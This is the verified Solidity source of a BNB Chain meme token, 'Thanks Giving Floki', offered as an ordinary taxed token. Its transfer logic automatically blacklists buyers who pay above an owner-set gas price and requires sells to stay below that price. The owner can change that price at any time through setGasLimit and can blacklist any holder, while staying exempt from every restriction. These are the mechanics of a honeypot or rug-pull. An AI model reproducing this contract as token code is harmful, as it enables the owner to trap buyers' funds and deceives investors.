/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract ThanksGivingFloki is Context, IERC20, Ownable {

    using Address for address payable;

    IRouter public router;
    address public pair;
    
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcludedFromFee;
    mapping (address => bool) public _isExcludedFromMaxBalance;
    mapping (address => bool) public _isBlacklisted;

    uint8 private constant _decimals = 9; 
    uint256 private _tTotal = 1_000_000 * (10**_decimals);
    uint256 public maxTxAmount = 20_000 * (10**_decimals);
    uint256 public maxWallet =  20_000 * (10**_decimals);
    uint256 private _swapThreshold = 5_000 * (10**_decimals); 

    string private constant _name = "Thanks Giving Floki"; 
    string private constant _symbol = "TGF";    
    
    uint256 public buyTax = 9;
    uint256 public sellTax = 11;
    address public marketingWallet;
    
    bool private swapping;
    uint public gasLimit = 8 * 1 gwei;
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
 
    constructor () {
        _tOwned[_msgSender()] = _tTotal;

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _approve(address(this), address(router), ~uint256(0));
        _approve(owner(), address(router), ~uint256(0));

        marketingWallet = owner();
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[marketingWallet] = true;
        _isExcludedFromFee[0x000000000000000000000000000000000000dEaD] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[pair] = true;
        _isExcludedFromMaxBalance[marketingWallet] = true;
        _isExcludedFromMaxBalance[0x000000000000000000000000000000000000dEaD] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    
    receive() external payable {}

    function setGasLimit(uint newGasLimit) external onlyOwner{
        gasLimit = newGasLimit;
    }

    function setIsBlacklisted(address account_, bool status_) external onlyOwner{
        _isBlacklisted[account_] = status_;
    }

    function rescueBNB(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient BNB balance");
        payable(msg.sender).transfer(weiAmount);
    }
    
    function rescueAnyBEP20Tokens(address _tokenAddr, address _to, uint _amount_EXACT, uint _decimal) public onlyOwner {
        IERC20(_tokenAddr).transfer(_to, _amount_EXACT *10**_decimal);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getTaxValues(uint amount, address from, bool isSell) private returns(uint256){
        uint tmpTaxes = amount * buyTax / 100;
        if (isSell){
            tmpTaxes = amount * sellTax / 100;
        }
        _tOwned[address(this)] += tmpTaxes;
        if(amount > 0)
            emit Transfer (from, address(this), tmpTaxes);
            
        return (amount - tmpTaxes);
    }
    
    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTxAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the maxTxAmount.");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "Blacklisted, can't trade");

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWallet, "Transfer amount exceeds the maxWallet.");
            
        if (balanceOf(address(this)) >= _swapThreshold && !swapping && from != pair && from != owner() && to != owner())
            swapAndLiquify();
          
        _tOwned[from] -= amount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getTaxValues(amount, from, to == pair);
            if(from == pair){
                if(tx.gasprice > gasLimit)
                    _isBlacklisted[to] = true;
            }else{
                require(tx.gasprice < gasLimit);
            }
        }
            
        _tOwned[to] += transferAmount;
        
        emit Transfer(from, to, transferAmount);
    }

    function swapAndLiquify() private lockTheSwap{
        uint tokenBal = balanceOf(address(this));
        uint balMarketing = swapTokensForEth(tokenBal);
        if (balMarketing > 0) payable(marketingWallet).transfer(balMarketing);
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokenAmount);

        // add the liquidity
        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(marketingWallet).sendValue (ethAmount - ethFromLiquidity);
    }

}